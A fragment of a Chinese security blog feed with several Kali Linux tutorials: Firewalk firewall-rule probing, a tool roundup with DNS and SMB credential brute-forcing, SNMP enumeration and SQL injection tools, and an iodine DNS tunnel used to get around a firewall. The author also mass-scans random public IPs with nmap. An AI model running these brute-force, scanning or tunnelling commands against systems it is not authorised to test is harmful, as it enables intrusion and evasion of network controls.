<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314170326_OXxGMH_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>理论分析完了，现在来看看我扫描公网时用的脚本，相当于我开了100 个进程，然后随即扫描公网中开放113 端口的主机</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314171237_IoEvHX_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>当启动脚本后，CPU 瞬间爆炸，后台也全是nmap 进程，我总共扫了1 w 个随机 IP ，结果只有8 个IP 开放了113 端口，不过只花费了4 min </li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314171711_pAgsuO_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02. 结语"></a>0x02. 结语</h2><h4 id="emsp-emsp-大家可以点击这里在bilibili-查看我的视屏演示"><a href="#emsp-emsp-大家可以点击这里在bilibili-查看我的视屏演示" class="headerlink" title="&emsp;&emsp;大家可以点击这里在bilibili 查看我的视屏演示"></a>&emsp;&emsp;大家可以点击这里在bilibili 查看我的<a href="https://www.bilibili.com/video/av20765871/" target="_blank" rel="external">视屏演示</a></h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Firewalk 原理]]></title>
      <url>/2018/03/10/Firewalk-%E5%8E%9F%E7%90%86/</url>
      <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o"><a href="#emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o" class="headerlink" title="&emsp;&emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^"></a>&emsp;&emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^</h4><a id="more"></a>
<h2 id="0x01-Firewalk-简介"><a href="#0x01-Firewalk-简介" class="headerlink" title="0x01. Firewalk 简介"></a>0x01. Firewalk 简介</h2><h4 id="emsp-emsp-Firewalk-是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP-UDP-配置的策略规则，因此在内网中使用-Firewalk-将是我们最理想的选择。"><a href="#emsp-emsp-Firewalk-是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP-UDP-配置的策略规则，因此在内网中使用-Firewalk-将是我们最理想的选择。" class="headerlink" title="&emsp;&emsp;Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。"></a>&emsp;&emsp;Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。</h4><h2 id="0x02-Firewalk-原理"><a href="#0x02-Firewalk-原理" class="headerlink" title="0x02. Firewalk 原理"></a>0x02. Firewalk 原理</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310171815_K8vVxh_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] Firewalk 主要是通过对 TTL 值的控制来达到探测目的的，下面介绍的原理理论上成立，但当我实际开防火墙测试时很多报文都会被防火墙过滤，但路由器测试毫无问题！</p>
</blockquote>
<h4 id="emsp-emsp-1-Firewalk-首先通过-PC-发送一个-TTL值为-1-的探测包到下一级-Gateway-的-33434-端口，如果-Gateway-接收到TTL-值为-1-的TCP-报文之后它会把TTL-减一变为-0，然后给-PC-回复一个-ICMP-报文，这样就能完成第一步的网络探测（当我测试防火墙的时候-TCP-报文被防火墙丢弃，便无法进行后续探测步骤）"><a href="#emsp-emsp-1-Firewalk-首先通过-PC-发送一个-TTL值为-1-的探测包到下一级-Gateway-的-33434-端口，如果-Gateway-接收到TTL-值为-1-的TCP-报文之后它会把TTL-减一变为-0，然后给-PC-回复一个-ICMP-报文，这样就能完成第一步的网络探测（当我测试防火墙的时候-TCP-报文被防火墙丢弃，便无法进行后续探测步骤）" class="headerlink" title="&emsp;&emsp;1. Firewalk 首先通过 PC 发送一个 TTL值为 1 的探测包到下一级 Gateway 的 33434 端口，如果 Gateway 接收到TTL 值为 1 的TCP 报文之后它会把TTL 减一变为 0，然后给 PC 回复一个 ICMP 报文，这样就能完成第一步的网络探测（当我测试防火墙的时候 TCP 报文被防火墙丢弃，便无法进行后续探测步骤）"></a>&emsp;&emsp;1. Firewalk 首先通过 PC 发送一个 TTL值为 1 的探测包到下一级 Gateway 的 33434 端口，如果 Gateway 接收到TTL 值为 1 的TCP 报文之后它会把TTL 减一变为 0，然后给 PC 回复一个 ICMP 报文，这样就能完成第一步的网络探测（当我测试防火墙的时候 TCP 报文被防火墙丢弃，便无法进行后续探测步骤）</h4><h4 id="emsp-emsp-2-探测完成之后PC-会发送TTL-为-2-的-TCP-UDP-包给Gateway-的不同端口，如果该端口没有被防火墙毙掉那么就能被-Gateway-转发到下一个节点，也就是图中的-firewall-，firewall-接到TTL-为1-的报文回复一个-ICMP-数据包，我们就能判断出-Gateway-被测的端口开放"><a href="#emsp-emsp-2-探测完成之后PC-会发送TTL-为-2-的-TCP-UDP-包给Gateway-的不同端口，如果该端口没有被防火墙毙掉那么就能被-Gateway-转发到下一个节点，也就是图中的-firewall-，firewall-接到TTL-为1-的报文回复一个-ICMP-数据包，我们就能判断出-Gateway-被测的端口开放" class="headerlink" title="&emsp;&emsp;2. 探测完成之后PC 会发送TTL 为 2 的 TCP/UDP 包给Gateway 的不同端口，如果该端口没有被防火墙毙掉那么就能被 Gateway 转发到下一个节点，也就是图中的 firewall ，firewall 接到TTL 为1 的报文回复一个 ICMP 数据包，我们就能判断出 Gateway 被测的端口开放"></a>&emsp;&emsp;2. 探测完成之后PC 会发送TTL 为 2 的 TCP/UDP 包给Gateway 的不同端口，如果该端口没有被防火墙毙掉那么就能被 Gateway 转发到下一个节点，也就是图中的 firewall ，firewall 接到TTL 为1 的报文回复一个 ICMP 数据包，我们就能判断出 Gateway 被测的端口开放</h4><h4 id="emsp-emsp-3-重复前两次操作测出内网中所有路由节点的策略规则"><a href="#emsp-emsp-3-重复前两次操作测出内网中所有路由节点的策略规则" class="headerlink" title="&emsp;&emsp;3. 重复前两次操作测出内网中所有路由节点的策略规则"></a>&emsp;&emsp;3. 重复前两次操作测出内网中所有路由节点的策略规则</h4><h2 id="0x03-Firewalk-实战"><a href="#0x03-Firewalk-实战" class="headerlink" title="0x03. Firewalk 实战"></a>0x03. Firewalk 实战</h2><h4 id="我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。"><a href="#我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。" class="headerlink" title="我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。"></a>我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。</h4><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><h4 id="emsp-emsp-1-kali-emsp-IP-192-168-1-107"><a href="#emsp-emsp-1-kali-emsp-IP-192-168-1-107" class="headerlink" title="&emsp;&emsp;1. kali &emsp;IP=192.168.1.107"></a>&emsp;&emsp;1. kali &emsp;IP=192.168.1.107</h4><h4 id="emsp-emsp-2-gateway-emsp-IP-192-168-1-1-（vlan-开放53，80端口）"><a href="#emsp-emsp-2-gateway-emsp-IP-192-168-1-1-（vlan-开放53，80端口）" class="headerlink" title="&emsp;&emsp;2. gateway &emsp;IP=192.168.1.1 （vlan 开放53，80端口）"></a>&emsp;&emsp;2. gateway &emsp;IP=192.168.1.1 （vlan 开放53，80端口）</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310191938_xHQroD_Screenshot.jpeg" alt=""></p>
<h4 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h4><blockquote>
<ol>
<li>首先配置路由器规则</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310192546_EDr687_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>启动 firewalk 进行探察（ 参数都很简单，不懂的可以通过 man 手册自行查看 ）</li>
</ol>
<p>firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 192.168.1.1 8.8.8.8</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>图中的 100.64.0.1 其实是下一节点的 IP 地址，如果它也在内网中是一个路由节点的话那么我们的下一条命令应该是firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 100.64.0.1 8.8.8.8  通过最上面我给大家看的测试用图可知100.64.0.1 其实是公网IP</li>
</ol>
</blockquote>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-其实-firewalk-真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。"><a href="#emsp-emsp-其实-firewalk-真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。" class="headerlink" title="&emsp;&emsp;其实 firewalk 真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。"></a>&emsp;&emsp;其实 firewalk 真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[kali使用入坑指南（二）]]></title>
      <url>/2018/03/08/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"><a href="#emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。" class="headerlink" title="&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"></a>&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。</h4><a id="more"></a>
<h2 id="0x01-DNS-爆破工具–fierce"><a href="#0x01-DNS-爆破工具–fierce" class="headerlink" title="0x01. DNS 爆破工具–fierce"></a>0x01. DNS 爆破工具–fierce</h2><blockquote>
<p>fierce 专用于爆破 DNS 域名，就像它的名字一样纯粹，平时msf 用的多了也喜欢用点简单小巧又功能实用的工具。在渗透测试时，偶尔会碰到某些域名的主站被做成了全静态页面，神仙也难渗透。此时从旁站渗透是必然的选择，这时候就需要用到 fierce 爆破二级域名对旁站下黑手了。再给大家推荐一篇<a href="http://cms.pengyueisos.com/wp/2017/12/一次web渗透测试的经历与分析（上）【鹏越·学霸专/" target="_blank" rel="external">渗透旁站的文章</a></p>
<p>爆破二级域名</p>
<p>fierce -dns kali.org -threads 10</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222717_PXjw12_Screenshot.jpeg" alt=""><br><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222753_JKcqYH_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-SMB-爆破工具–acccheck"><a href="#0x02-SMB-爆破工具–acccheck" class="headerlink" title="0x02. SMB 爆破工具–acccheck"></a>0x02. SMB 爆破工具–acccheck</h2><blockquote>
<p>acccheck是用于探测远程目标主机是否开放smb服务,并尝试连接目标默认IPC$、ADMIN$共享,并通过字典文件尝试爆破 smb 服务的账号密码。有些工具比较简单，所以命令我就不一一介绍了，大家直接用 acccheck -h 就能查看具体的参数介绍。</p>
<p>acccheck -t 192.168.122.140 -u times0ng -P /usr/share/wordlists/wfuzz/general/common.txt -v</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225313_sPwpVJ_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225518_JesTGg_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-SNMP-信息枚举工具–-snmp-check"><a href="#0x03-SNMP-信息枚举工具–-snmp-check" class="headerlink" title="0x03. SNMP 信息枚举工具– snmp-check"></a>0x03. SNMP 信息枚举工具– snmp-check</h2><blockquote>
<p>简单网络管理协议（SNMP）是TCP／IP协议簇的一个应用层协议，工作在UDP 161端口，用于监控目标设备的操作系统、硬件设备、服务应用、软硬件配置、网络协议状态、设备性能及资源利用率、设备报错事件信息、应用程序状态等软硬件信息。对于渗透测试者来说简直就是信息宝藏，一旦这个服务协议被利用，那么目标的大部分配置信息都会暴露无遗，对于企业来说这是致命的，而想要利用这个协议的弱点只需要服务器管理员缺乏安全意识做一些默认配置即可。</p>
<p>这个工具并不支持对 public 的爆破，但如果使用 hydra 爆破public 之后再使用snmp-check 获取 SNMP 协议提供的海量信息的话简直是 perfect</p>
<p>snmp-check 192.168.1.109 -c public -v 2c</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/911ea4f2fd7ee502e967a3c99fb7163b/xmlnote/1B20B5FDF95B4D3E8A2AA48AB71D9D46/3879" alt="image"></p>
<h2 id="0x04-路由策略探测工具–Firewalk"><a href="#0x04-路由策略探测工具–Firewalk" class="headerlink" title="0x04. 路由策略探测工具–Firewalk"></a>0x04. 路由策略探测工具–Firewalk</h2><blockquote>
<p>Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。如果想了解 firewalk 的原理请 <a href="https://times0ng.github.io/2018/03/10/Firewalk-原理/">点击这里</a></p>
<p>首先apt-get 安装firewalk，然后启动 firewalk 进行探察（ 参数都很简单，不懂的可以通过 man 手册自行查看 ）</p>
<p>firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 192.168.1.1 8.8.8.8</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-图形化sql自动注入工具—-jSQL"><a href="#0x05-图形化sql自动注入工具—-jSQL" class="headerlink" title="0x05. 图形化sql自动注入工具—-jSQL"></a>0x05. 图形化sql自动注入工具—-jSQL</h2><blockquote>
<p>jSQL injection是一款基于JAVA开发的图形化 SQL 自动注入工具，包含数据库查询、后台爆破、文件读取、命令行、文件上传、目录爆破、编码转换等众多功能，既支持GET 型SQL 注入，也同时支持POST 型注入，还能定制header 头，是一款不可多得的好工具，很像kali 版御剑</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328215004_6eQEsq_Screenshot.jpeg" alt=""></p>
<h2 id="0x06-WEB-漏洞扫描工具—-OWASP-ZAP"><a href="#0x06-WEB-漏洞扫描工具—-OWASP-ZAP" class="headerlink" title="0x06. WEB 漏洞扫描工具—-OWASP-ZAP"></a>0x06. WEB 漏洞扫描工具—-OWASP-ZAP</h2><blockquote>
<p>最近自己利用 OWASP-ZAP 简单录制了一套web 渗透教程发到b 站了，大家有兴趣可以<a href="https://www.bilibili.com/video/av20890776/" target="_blank" rel="external">点这里</a>，基本用法我都提到过了，还简单讲了一些渗透环境的搭建和利用。</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328220834_N7Y5J3_Screenshot.jpeg" alt=""></p>
<h2 id="0x07-“kali-下的菜刀”—-Altman"><a href="#0x07-“kali-下的菜刀”—-Altman" class="headerlink" title="0x07. “kali 下的菜刀”—-Altman"></a>0x07. “kali 下的菜刀”—-Altman</h2>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[利用iodine绕过防火墙]]></title>
      <url>/2018/03/01/%E5%88%A9%E7%94%A8iodine%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/</url>
      <content type="html"><![CDATA[<h2 id="0x00-iodine简介"><a href="#0x00-iodine简介" class="headerlink" title="0x00. iodine简介"></a>0x00. iodine简介</h2><h4 id="emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！"><a href="#emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！" class="headerlink" title="&emsp;&emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！"></a>&emsp;&emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！</h4><a id="more"></a>
<h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01. 环境配置"></a>0x01. 环境配置</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-ubuntu-emsp-IP-1-1-1-10"><a href="#emsp-emsp-ubuntu-emsp-IP-1-1-1-10" class="headerlink" title="&emsp;&emsp;ubuntu&emsp;IP=1.1.1.10"></a>&emsp;&emsp;ubuntu&emsp;IP=1.1.1.10</h4><h4 id="emsp-emsp-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-109"><a href="#emsp-emsp-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-109" class="headerlink" title="&emsp;&emsp;monowall&emsp;LAN IP=1.1.1.1&emsp;WAN IP=192.168.1.109"></a>&emsp;&emsp;monowall&emsp;LAN IP=1.1.1.1&emsp;WAN IP=192.168.1.109</h4><h4 id="emsp-emsp-w2k3-emsp-IP-192-168-1-108"><a href="#emsp-emsp-w2k3-emsp-IP-192-168-1-108" class="headerlink" title="&emsp;&emsp;w2k3&emsp;IP=192.168.1.108"></a>&emsp;&emsp;w2k3&emsp;IP=192.168.1.108</h4><h4 id="emsp-emsp-kali-linux-emsp-IP-192-168-1-107"><a href="#emsp-emsp-kali-linux-emsp-IP-192-168-1-107" class="headerlink" title="&emsp;&emsp;kali linux&emsp;IP=192.168.1.107"></a>&emsp;&emsp;kali linux&emsp;IP=192.168.1.107</h4><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><blockquote>
<p>[*] 接下来我将按照下图配置实验环境，通过iodine绕过防火墙限制.</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301210737_kS5adL_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>首先配置firewall，限制ubuntu的上网能力，让它只能通过 UDP 53端口访问DNS 服务器w2k3</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301211815_oLwE6D_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>修改 ubuntu 的/etc/resolv.conf 文件，指定自己的 DNS 解析服务器为w2k3（192.168.1.108）</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301212345_NrgJ35_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>配置 DNS 服务器w2k3，并委派二级域名给 kali 主机</li>
</ol>
<p>[*] _1. 设置静态IP</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301213258_iefU0H_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _2. 创建主域 times0ng.org</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301213519_oaBMz2_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _3. 添加 kali 的主机记录</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301213738_mUUxyM_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _4. 配置转发器，这样让w2k3可以解析公网域名</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301214158_olvW8g_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _5. 委派二级域名</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301214431_F4tb8U_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _6. 查看ubuntu上的域名解析记录，可以看到 ubuntu 已经能正确解析我们的 w2k3 和 kali 了</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301214910_bBF3h9_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>启动 kali 服务器端 iodined 和 ubuntu 的客户端 iodine</li>
</ol>
<p>iodined -f -c 2.2.2.2 www.times0ng.org</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301215803_FRK2Ke_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>iodine -f www.times0ng.org</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301215953_KMndUT_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>ubuntu 已经通过UDP 53 端口成功和 kali 建立隧道，可以利用之前设置的IP 2.2.2.2 进行网络通信了</li>
</ol>
<p>ssh -X root@2.2.2.2</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301220633_FX4p67_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>因为ubuntu 本身被防火墙限制不能上网，但我们可以将流量通过kali转发出去进行上网通信</li>
</ol>
<p>ssh -CNfg -D 8080 root@2.2.2.2</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301220853_0ex9Bc_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301220923_sIRb8G_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02. 结语"></a>0x02. 结语</h2><h4 id="emsp-emsp-真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。"><a href="#emsp-emsp-真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。" class="headerlink" title="&emsp;&emsp;真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。"></a>&emsp;&emsp;真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[kali使用入坑指南(一)]]></title>
      <url>/2018/03/01/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！"><a href="#emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！" class="headerlink" 